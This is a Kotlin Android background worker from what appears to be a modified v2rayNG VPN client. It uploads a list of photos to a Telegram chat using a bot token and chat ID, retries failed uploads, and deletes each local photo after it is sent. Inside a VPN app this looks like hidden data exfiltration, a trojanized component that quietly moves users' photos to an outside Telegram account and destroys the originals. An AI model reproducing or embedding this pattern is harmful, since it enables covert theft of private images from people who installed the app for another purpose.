package com.v2ray.ang.workers

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.v2ray.ang.manager.TelegramUploader
import java.io.File

class UploadWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    companion object {
        const val KEY_TOKEN = "key_token"
        const val KEY_CHAT_ID = "key_chat_id"
        const val KEY_PHOTO_PATHS = "key_photo_paths"
    }

    override suspend fun doWork(): Result {
        val token = inputData.getString(KEY_TOKEN)
        val chatId = inputData.getString(KEY_CHAT_ID)
        val photoPaths = inputData.getStringArray(KEY_PHOTO_PATHS)

        if (token.isNullOrBlank() || chatId.isNullOrBlank() || photoPaths.isNullOrEmpty()) {
            Log.e("UploadWorker", "Invalid input data (token, chatID, or paths are missing). Marking as failure.")
            return Result.failure()
        }

        Log.d("UploadWorker", "Starting upload worker for ${photoPaths.size} photos.")

        for (path in photoPaths) {
            val photoFile = File(path)
            if (!photoFile.exists()) {
                Log.w("UploadWorker", "File not found, likely already uploaded. Skipping: $path")
                continue
            }

            val success = TelegramUploader.sendPhoto(token, chatId, photoFile)

            if (success) {
                Log.d("UploadWorker", "Successfully uploaded ${photoFile.name}. Deleting local file.")
                if (!photoFile.delete()) {
                    Log.w("UploadWorker", "Failed to delete photo file: ${photoFile.absolutePath}")
                }
            } else {
                Log.e("UploadWorker", "Failed to upload ${photoFile.name}. Will retry later.")
                // If one file fails, we want to retry the whole job.
                // The successfully uploaded files from this run are already deleted.
                // On the next run, they will be skipped because they no longer exist.
                return Result.retry()
            }
        }

        Log.d("UploadWorker", "All photos in this batch were uploaded successfully.")
        return Result.success()
    }
}
